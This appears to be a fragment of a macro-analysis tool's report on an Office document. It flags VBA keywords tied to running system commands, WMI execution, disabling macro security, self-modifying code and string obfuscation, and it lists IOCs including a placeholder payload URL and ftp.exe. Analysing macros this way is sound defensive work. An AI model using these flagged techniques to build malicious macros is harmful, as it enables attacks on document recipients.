|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/               |                                             |
|IOC       |http://www.yourURL.c|URL                                          |
|          |om/payload.txt      |                                             |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

